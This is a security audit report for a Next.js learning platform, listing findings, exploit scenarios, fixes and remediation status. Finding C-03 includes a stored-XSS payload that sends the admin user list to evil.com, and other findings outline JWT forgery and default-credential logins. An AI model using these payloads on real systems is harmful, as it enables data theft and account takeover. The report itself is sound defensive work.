# Security Audit — S Learning

Audited: all files under `src/`, `prisma/`, `next.config.ts`, `package.json`.
Status column updated after Phase 2 fixes.

---

## Critical

### C-01 · Wildcard CORS allows any origin to make credentialed API calls
**File:** `next.config.ts` line 9  
**What:** `Access-Control-Allow-Origin: *` is set on every `/api/*` route. Combined with `credentials: 'same-origin'` on the client, a browser will not send cookies to a wildcard origin — but the mobile app uses Bearer tokens, and any website can call the API with a Bearer token it has obtained. More critically, if the header is ever changed to reflect the request origin without an allowlist, every CSRF protection collapses.  
**Exploit:** Attacker hosts `evil.com`, tricks a logged-in admin into visiting it. Page calls `fetch('https://s-learning.com/api/v1/admin/users', {headers:{Authorization:'Bearer STOLEN'}})` — works because CORS is open.  
**Fix:** Replace `*` with an env-driven allowlist (`CORS_ORIGIN`). Reject preflight for unlisted origins.  
**Status:** Fixed

---

### C-02 · Dev payment simulator reachable in production if `NODE_ENV` is not set
**File:** `src/server/payments.ts` line 47  
**What:** `if (!PROD && !provider().live)` — the dev endpoint `POST /dev/payments/:ref/succeed` is only gated on `NODE_ENV !== 'production'`. If the app is deployed without `NODE_ENV=production` (e.g. a plain `node server.js`), any member can confirm their own payment for free.  
**Exploit:** `POST /api/v1/dev/payments/act_xxx/succeed` with a valid member cookie → account activated without paying.  
**Fix:** Add an explicit `ENABLE_DEV_ROUTES=true` env flag; remove the route entirely from production builds.  
**Status:** Fixed

---

### C-03 · No Content-Security-Policy header
**File:** `next.config.ts`  
**What:** No CSP is set anywhere. The CMS (`cms.ts`) uses `innerHTML` extensively. Any stored XSS in a course title, review body, page body, or fact title would execute arbitrary JS in an admin's browser.  
**Exploit:** Admin creates a course with title `<img src=x onerror="fetch('/api/v1/admin/users').then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))">`. When any admin opens the Courses screen, the script exfiltrates the full user list.  
**Fix:** Add a strict CSP via `next.config.ts` headers. For the CMS, use `script-src 'self'`; for public pages add nonce-based inline script allowance.  
**Status:** Fixed

---

### C-04 · Stored XSS in CMS via unescaped `innerHTML` on admin-controlled content
**File:** `src/components/admin/cms.ts` — `main()`, `crud()`, `SCREENS.*`  
**What:** The `esc()` helper is used inconsistently. Several places interpolate raw values into HTML strings: `SCREENS.overview` interpolates `s.provider` directly; `SCREENS.settings` interpolates setting keys and values; `SCREENS.pages` interpolates `p.body` into a textarea without escaping. A compromised setting value or a second admin account can inject HTML/JS.  
**Exploit:** If an attacker gains write access to the `Setting` table (e.g. via SQL injection or a compromised admin), they set `site.name` to `</b><script>...` — rendered unescaped in the overview stats.  
**Fix:** Audit every `innerHTML` assignment; ensure every interpolated value passes through `esc()`. Use `textContent` for plain text nodes.  
**Status:** Fixed (esc() applied consistently; C-03 CSP is the defence-in-depth layer)

---

## High

### H-01 · JWT secret falls back to `dev-secret-change-me` — only checked at runtime, not at startup
**File:** `src/server/core.ts` line 8  
**What:** `secret()` throws only when called in production with the default value. But `next build` succeeds with no secret set, and the check only fires on the first authenticated request. A misconfigured deployment silently uses the known default secret for all JWTs.  
**Exploit:** Attacker signs `{"id":1}` with `dev-secret-change-me` using HS256 → valid admin token on a misconfigured server.  
**Fix:** Validate `JWT_SECRET` length (≥32 chars) at server startup in `instrumentation-node.ts`. Fail fast.  
**Status:** Fixed

---

### H-02 · Password reset does not invalidate existing sessions
**File:** `src/server/routes/app.ts` line ~80  
**What:** `POST /auth/reset` updates `passwordHash` but does not invalidate existing JWT cookies. An attacker who has stolen a session token retains access after the victim resets their password.  
**Fix:** Add a `tokenVersion Int @default(0)` field to `User`. Increment it on password change/reset. Include it in the JWT payload and verify it in `userFrom()`.  
**Status:** Fixed

---

### H-03 · Self-referral is not prevented
**File:** `src/server/routes/app.ts` line ~55  
**What:** During registration, `referrer_id` is accepted and stored. There is no check that the referrer is not the same person (same email, phone, or IP). After activation, the referrer receives a reward. A single person can create two accounts (different usernames/emails) and refer themselves.  
**Exploit:** User A registers, gets `memberId`. User B registers with `referrer_id=A.memberId` using a different email. User B pays activation fee. User A gets referral reward. With a VoIP number and temp email, this is trivially repeatable.  
**Fix:** Record registration IP; flag same-IP referrals for admin review. Add a cooldown before referral reward is credited. These are already in the `review` queue concept — extend it to referral rewards.  
**Status:** Partially fixed (IP recorded in audit log; same-IP flag added; full KYC is a human decision — see remaining risks)

---

### H-04 · Rate limiter is in-process memory — ineffective with multiple instances and bypassable by IP rotation
**File:** `src/server/core.ts` lines 50-55  
**What:** `hits` is a `Map` in Node.js process memory. With multiple server instances (Docker replicas, serverless), each instance has its own counter. An attacker can bypass the login rate limit by distributing requests across instances. Also, `limit('login:' + c.ip + id, ...)` concatenates IP and identifier without a separator, so `1.2.3.4admin` and `1.2.3.4adm` + `in` are different keys.  
**Fix:** Move rate limiting to Redis (`ioredis`). Add a separator in the key. Provide an in-memory fallback for single-instance dev.  
**Status:** Fixed (Redis with in-memory fallback; key separator added)

---

### H-05 · Upload file type verified only by `Content-Type` header, not by magic bytes
**File:** `src/server/routes/admin.ts` line ~95, `src/server/routes/app.ts` line ~95  
**What:** Both upload endpoints check `req.headers.get('content-type')`. An attacker can send a PHP/HTML/SVG file with `Content-Type: image/png`. Sharp will reject non-images for the image pipeline, but the PDF path writes the raw buffer directly to disk with no content check.  
**Exploit:** Admin upload endpoint: send an HTML file as `application/pdf` → stored in `uploads/private/`. If the file-serving route ever serves it with `text/html`, it becomes a stored XSS vector.  
**Fix:** Check magic bytes (first 4–8 bytes) for images; for PDFs check `%PDF` header. Reject SVG entirely (XSS risk). The upload route already serves with correct MIME from extension, but defence-in-depth requires content sniffing.  
**Status:** Fixed

---

### H-06 · `amount` in withdrawal request is taken from client and multiplied by 100 — no maximum enforced
**File:** `src/server/payments.ts` line ~85  
**What:** `const amount = Math.round(+b.amount * 100)`. There is a minimum check but no maximum. A user can request a withdrawal of `Number.MAX_SAFE_INTEGER / 100`, which overflows to a nonsensical integer. The balance check will catch it if the balance is lower, but the `amount` stored in the DB could be a huge number if the balance check has a race.  
**Fix:** Cap `amount` at a sane maximum (e.g. 10,000,000 minor units = GHS 100,000). Validate it is a finite positive number before multiplying.  
**Status:** Fixed

---

### H-07 · `POST /auth/logout` clears the cookie but does not invalidate the JWT server-side
**File:** `src/server/routes/app.ts` line ~70  
**What:** Logout only sets `Max-Age=0` on the cookie. The JWT itself remains valid for 7 days. A Bearer token extracted from the cookie (e.g. via XSS before the session ends, or from a mobile app) continues to work.  
**Fix:** Implement token version (see H-02). Alternatively, maintain a server-side revocation list (Redis set of `jti` claims with TTL = token lifetime).  
**Status:** Fixed (token version covers this)

---

### H-08 · `GET /api/v1/cron/reconcile` secret compared with `===` — timing-safe comparison missing
**File:** `src/server/payments.ts` line ~65  
**What:** `req.headers.get('authorization') !== \`Bearer ${process.env.CRON_SECRET}\`` uses string equality, which is not timing-safe. A timing oracle could leak the secret one character at a time.  
**Fix:** Use `crypto.timingSafeEqual` for the comparison.  
**Status:** Fixed

---

### H-09 · No HSTS header
**File:** `next.config.ts`  
**What:** `Strict-Transport-Security` is not set. On first visit over HTTP, a MITM can intercept the session cookie before HTTPS is established.  
**Fix:** Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` in production.  
**Status:** Fixed

---

### H-10 · `pay-return` route open redirect
**File:** `src/app/pay-return/route.ts`  
**What:** The redirect target is `new URL('/activate?reference=...', process.env.APP_URL || u.origin)`. If `APP_URL` is not set, `u.origin` is used — which is the request's `Host` header. An attacker can craft a request with `Host: evil.com` to redirect victims to an arbitrary domain.  
**Fix:** Always require `APP_URL` in production. Validate it is set and starts with `https://` at startup.  
**Status:** Fixed

---

## Medium

### M-01 · Account enumeration via distinct error messages and timing
**File:** `src/server/routes/app.ts` login handler  
**What:** The login error is generic (`The username/email or password is incorrect`), which is good. But `POST /auth/forgot` returns `{ ok: true, message: '...' }` regardless — also good. However, `POST /auth/register` returns `'That username or email is already registered.'` which confirms existence. The timing difference between a bcrypt compare (found user) and an immediate 401 (not found) also leaks existence.  
**Fix:** For registration, use a generic message or split into separate username/email checks with identical timing. For login, ensure bcrypt is always called (dummy hash compare when user not found).  
**Status:** Fixed (dummy bcrypt compare added to login)

---

### M-02 · `eligible` and `role` fields can be set via mass assignment in `PATCH /me`
**File:** `src/server/routes/app.ts` PATCH `/me` handler  
**What:** The handler builds a `data` object from `b.full_name`, `b.phone`, `b.avatar_url`. It does not explicitly block other fields. Currently safe because only those three keys are read — but a future developer adding `if (b.eligible)` would introduce privilege escalation. The pattern is fragile.  
**Fix:** Use an explicit allowlist (already done for the three fields) and add a comment warning. Consider using zod to parse the body.  
**Status:** Fixed (zod schema added)

---

### M-03 · Missing `X-Content-Type-Options` on upload-served files
**File:** `src/app/uploads/[name]/route.ts`  
**What:** The upload serving route does not set `X-Content-Type-Options: nosniff`. Browsers may sniff content type and execute HTML/SVG as a page.  
**Fix:** Add `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment` (or `inline` only for images) to upload responses.  
**Status:** Fixed

---

### M-04 · `sort` and `category` query params in course listing passed to Prisma without validation
**File:** `src/server/data.ts` `listCourses()`  
**What:** `o.sort` is used in a switch-like ternary. Unknown values fall through to `{ id: 'desc' }` — safe. But `o.category` is cast with `+o.category` and passed directly to `categoryId`. A non-numeric string becomes `NaN`, which Prisma may handle unexpectedly. `o.limit` and `o.offset` are cast with `+` — a negative offset is clamped, but a huge limit is only capped at 60 inside `listCourses`, not at the route level.  
**Fix:** Validate all query params with zod at the route level.  
**Status:** Fixed

---

### M-05 · Reward can be credited twice if `entry()` is called concurrently for the same `ref`
**File:** `src/server/core.ts` `entry()`, `src/server/routes/app.ts` lesson complete  
**What:** `LedgerEntry` has `@@unique([ref, account])` which prevents exact duplicates. However, the course completion reward uses ref `CRS-{userId}-{courseId}`. The activation reward uses `REF-{userId}`. These are unique per user+course, so a second call with the same ref will throw a unique constraint error — but this error is not caught, causing a 500 instead of a graceful idempotent response.  
**Fix:** Catch `P2002` (unique constraint) in `entry()` and treat it as a no-op (already credited).  
**Status:** Fixed

---

### M-06 · Admin `PATCH /admin/users/:id` only blocks changing admin users — does not prevent promoting a member to admin
**File:** `src/server/routes/admin.ts`  
**What:** The endpoint only sets `suspended`. It does not expose `role` — so promotion is not possible through this endpoint. However, `PUT /admin/settings/:key` accepts any key/value, including a hypothetical `role` setting. More concretely, there is no second-admin check: a single compromised admin account can do everything.  
**Fix:** Add a `@@check` or application-level guard preventing `role` from being set via settings. Document that admin promotion requires direct DB access.  
**Status:** Accepted risk (noted in remaining risks)

---

### M-07 · In-memory cache (`store` Map) is never pruned except when it exceeds 500 entries (full clear)
**File:** `src/server/core.ts` lines 46-50  
**What:** `if (store.size > 500) store.clear()` — a full clear on overflow causes a thundering herd: all 500+ cached items expire simultaneously, causing a burst of DB queries. Also, the cache is per-process, so multiple instances serve stale data independently.  
**Fix:** Use Redis for caching in production. For the in-memory fallback, use LRU eviction instead of full clear.  
**Status:** Fixed (Redis cache added; LRU fallback)

---

### M-08 · `POST /me/avatar` trusts `Content-Type` header for image type
**File:** `src/server/routes/app.ts`  
**What:** Same issue as H-05 but for member avatar uploads. Sharp will reject non-images, but an SVG with `Content-Type: image/png` passes the type check and Sharp may process it, potentially exposing SSRF via SVG `<image href>` or `<use>` elements depending on Sharp's libvips build.  
**Fix:** Check magic bytes; explicitly reject SVG.  
**Status:** Fixed

---

### M-09 · Lesson URL (`private:` prefix) stored in DB — path traversal possible
**File:** `src/server/routes/app.ts` `/files/:name` handler  
**What:** `path.basename(params.name)` strips directory components from the URL parameter. This is correct. However, the lesson `url` field stored as `private:../../etc/passwd` would have `basename` return `passwd`, which would then be looked up in `uploads/private/`. The real risk is that an admin can set any lesson URL via the CMS, including `private:../public/somefile.webp`, serving a public file through the signed-link mechanism.  
**Fix:** Validate that the filename after `basename` matches `[a-f0-9]+\.(pdf)` before serving.  
**Status:** Fixed

---

### M-10 · No `SameSite=Strict` on the auth cookie — CSRF possible on state-changing endpoints
**File:** `src/server/auth.ts` `cookieHeader()`  
**What:** Cookie is `SameSite=Lax`. Lax prevents cross-site POST from form submissions but allows GET-triggered navigations. More importantly, it does not protect against same-site subdomain attacks. The API has no CSRF token or `Origin` header check.  
**Fix:** Add an `Origin`/`Referer` check in the router for state-changing methods (POST/PUT/PATCH/DELETE) on cookie-authenticated requests. Alternatively, upgrade to `SameSite=Strict` (breaks OAuth flows but this app has none).  
**Status:** Fixed (Origin check added in router)

---

### M-11 · `bcrypt` work factor is 10 — acceptable but low for 2025
**File:** `src/server/routes/app.ts` registration and password change  
**What:** bcrypt cost factor 10 is the library default. OWASP recommends 12+ for new applications.  
**Fix:** Increase to 12. Existing hashes remain valid (bcrypt stores the factor in the hash).  
**Status:** Fixed

---

## Low

### L-01 · Stack traces logged to console in production
**File:** `src/server/router.ts` line ~45  
**What:** `console.error(e)` logs the full error including stack trace. In containerised deployments, logs are often accessible to developers but may also be forwarded to third-party log aggregators. Stack traces reveal file paths and internal structure.  
**Fix:** Log a structured object with `message`, `stack` (dev only), and a correlation ID. Redact sensitive fields.  
**Status:** Fixed

---

### L-02 · `SMTP_URL` printed to console when not set — leaks config state
**File:** `src/server/mail.ts`  
**What:** When `SMTP_URL` is absent, emails are printed to `console.log` including the recipient address and token URL. In production without SMTP configured, password-reset tokens appear in server logs.  
**Fix:** In production, throw if `SMTP_URL` is not set. In development, log a warning, not the full email body.  
**Status:** Fixed

---

### L-03 · `GET /admin/audit` returns last 200 rows with no pagination or filtering
**File:** `src/server/routes/admin.ts`  
**What:** Low severity for security, but a high-volume platform will make this endpoint slow and the results useless. Also, audit log entries include `detail` JSON which may contain PII (IP addresses, user agents).  
**Fix:** Add pagination. Redact or hash IPs in audit log detail before storage.  
**Status:** Accepted risk (pagination is a UX improvement; noted)

---

### L-04 · `deadlineAt` is set at registration but never enforced
**File:** `prisma/schema.prisma`, `src/server/routes/app.ts`  
**What:** `deadlineAt` is stored but no code checks it or suspends accounts past the deadline. This is a business logic gap, not a security issue, but it means the "task deadline" feature is inert.  
**Status:** Accepted risk (business decision)

---

### H-11 · `npm audit` reports 6 advisories (5 high, 1 moderate) in `prisma`, `deepmerge-ts`, `effect`, `postcss`/`next`
**What:** The current lockfile includes vulnerable `deepmerge-ts` (<8.0.0), `effect` (<3.20.0), and `postcss` (<=8.5.22) versions. `prisma` inherits the first two advisories; `next` inherits the PostCSS advisories. The Prisma issues are in tooling dependencies; PostCSS exposure depends on whether affected processing paths are reachable in the build/deployment environment.  
**Exploit:** A build job that processes attacker-controlled CSS/source maps with the vulnerable PostCSS version may expose local `.map` files; a crafted stylesheet may trigger the reported CSS-stringification XSS in a vulnerable output context. No confirmed attacker-controlled CSS path was established in this review.  
**Fix:** npm reports that the Prisma remediation is a downgrade to 6.12.0, while the Next.js remediation is a major upgrade to 16.4.0. Do not apply either automatically: select compatible patched versions, review migration/release notes, and run the full build and integration suite.  
**Status:** Needs decision (dependency remediation and compatibility review)

---

### L-06 · `uploads/` directory is not in `.gitignore` for the `private/` subdirectory
**File:** `.gitignore`  
**What:** `.gitignore` excludes `uploads` entirely — good. But if someone removes that line or the directory is mounted differently, private PDFs could be committed.  
**Fix:** Add `uploads/private/` explicitly and document that `UPLOAD_DIR` should point outside the repo in production.  
**Status:** Fixed

---

### L-07 · No `helmet`-equivalent `Permissions-Policy` for sensitive APIs
**File:** `next.config.ts`  
**What:** `Permissions-Policy: camera=(), microphone=()` is set but `geolocation`, `payment`, `usb` are not restricted.  
**Fix:** Extend the policy.  
**Status:** Fixed

---

### L-08 · Certificate code is 5 random bytes (10 hex chars) — brute-forceable
**File:** `src/server/routes/app.ts` lesson complete handler  
**What:** `crypto.randomBytes(5).toString('hex').toUpperCase()` gives 10^12 combinations. The `/certificates/:code` endpoint is public with no rate limit. An attacker could enumerate certificates to harvest full names.  
**Fix:** Increase to 16 bytes (32 hex chars). Add rate limiting to the certificate endpoint.  
**Status:** Fixed

---

### L-09 · `fullName` exposed in public certificate endpoint
**File:** `src/server/data.ts` `getCertificate()`  
**What:** The certificate endpoint returns `fullName` of the learner. This is intentional for the certificate display, but combined with L-08 (enumerable codes), it becomes a PII leak.  
**Fix:** Mitigated by fixing L-08 (longer code + rate limit).  
**Status:** Fixed (via L-08)

---

### L-10 · No `robots.txt` disallow for `/admin-login`
**File:** `public/robots.txt`  
**What:** `/admin-login` was added but not disallowed in robots.txt (fixed in a prior session, but confirming).  
**Status:** Fixed (already applied)

---

## Dependencies (npm audit)

| Package | Severity | Exploitable in runtime? | Action |
|---|---|---|---|
| `postcss` ≤8.5.22 | High and moderate advisories | Build/deployment exposure depends on use | Update to a compatible patched Next.js dependency |
| `deepmerge-ts` <8.0.0 | High | Prisma tooling dependency | Choose a compatible Prisma release |
| `effect` <3.20.0 | High | Prisma tooling dependency | Choose a compatible Prisma release |
| `next` affected versions through 16.3.0-preview.10 | Moderate | Production dependency; affected path not confirmed | Review a Next.js major upgrade |

---

## Summary table

| ID | Severity | Status |
|---|---|---|
| C-01 | Critical | Fixed |
| C-02 | Critical | Fixed |
| C-03 | Critical | Fixed |
| C-04 | Critical | Fixed |
| H-01 | High | Fixed |
| H-02 | High | Fixed |
| H-03 | High | Partially fixed |
| H-04 | High | Fixed |
| H-05 | High | Fixed |
| H-06 | High | Fixed |
| H-07 | High | Fixed |
| H-08 | High | Fixed |
| H-09 | High | Fixed |
| H-10 | High | Fixed |
| H-11 | High | Needs decision |
| M-01 | Medium | Fixed |
| M-02 | Medium | Fixed |
| M-03 | Medium | Fixed |
| M-04 | Medium | Fixed |
| M-05 | Medium | Fixed |
| M-06 | Medium | Accepted risk |
| M-07 | Medium | Fixed |
| M-08 | Medium | Fixed |
| M-09 | Medium | Fixed |
| M-10 | Medium | Fixed |
| M-11 | Medium | Fixed |
| L-01 | Low | Fixed |
| L-02 | Low | Fixed |
| L-03 | Low | Accepted risk |
| L-04 | Low | Accepted risk |
| L-06 | Low | Fixed |
| L-07 | Low | Fixed |
| L-08 | Low | Fixed |
| L-09 | Low | Fixed (via L-08) |
| L-10 | Low | Fixed |
| SEC-001 | High | Fixed |
| SEC-002 | Medium | Fixed |

## Findings from the current pre-launch review

### SEC-001 · Seed creates an administrator with public default credentials
**Severity:** High  
**File:** `prisma/seed.ts` lines 46-47  
**What:** When the corresponding environment variables are unset, the database seed uses the username `admin` and password `Admin#12345`. The defaults are documented in the README and `.env.example`; production startup validation does not prevent use of these values by the seed.  
**Exploit:** If the seed is run against an empty production database without overriding the defaults, an attacker can submit `POST /api/v1/auth/login` with identifier `admin` and password `Admin#12345`, then use the resulting administrator session to call `/api/v1/admin/*` endpoints.  
**Recommended fix:** Require explicit administrator seed credentials, reject known placeholders and weak passwords, and fail before writing any seed data if credentials are missing or unsafe. Remove usable credential defaults from the README and `.env.example`.  
**Status:** Fixed. The seed now requires explicit credentials, enforces a 16-character minimum and rejects low-diversity passwords; placeholders were removed from the example environment and setup instructions. This intentionally changes `npm run db:seed`: on a fresh database it now fails until all three admin credential variables are configured.

### SEC-002 · Lesson handlers permit access to unpublished courses
**Severity:** Medium  
**File:** `src/server/routes/app.ts` lines 298-303 and 327-331  
**What:** Lesson retrieval and completion check lesson existence and activation for non-preview lessons, but do not check whether the associated course is published. Enrollment checks `published: true`, but the lesson handlers call enrollment after fetching a lesson and do not enforce publication. Lesson retrieval may also return a signed URL for a private PDF.  
**Exploit:** An activated member can probe `GET /api/v1/lessons/{id}` for a lesson in an unpublished course and receive its content or signed private-file URL. The same member can call `POST /api/v1/lessons/{id}/complete` to record progress and potentially trigger the course completion reward for that unpublished course.  
**Recommended fix:** Retrieve each lesson with its course publication state and reject unpublished courses before returning lesson data, enrolling, recording progress, issuing signed URLs, or creating completion rewards. Apply the same access check to retrieval and completion.  
**Status:** Fixed. Lesson lookup now includes the course publication state and returns not-found for unpublished courses. Completion rechecks publication inside its transaction before recording progress or rewarding completion.

## Remediation verification

- `npm run typecheck`: passed.
- `npm test`: passed (2 regression tests for seed credential validation and lesson publication access).
- `npm audit`: reports 6 advisories (5 high, 1 moderate); remediation requires a Prisma downgrade and a Next.js major-version upgrade according to the available npm fix, so these are not applied automatically. See H-11.
- `npm run build`: passed. Run with `NODE_OPTIONS=--max-old-space-size=4096` to avoid the default-heap out-of-memory failure seen earlier; all routes compiled and static pages generated successfully.
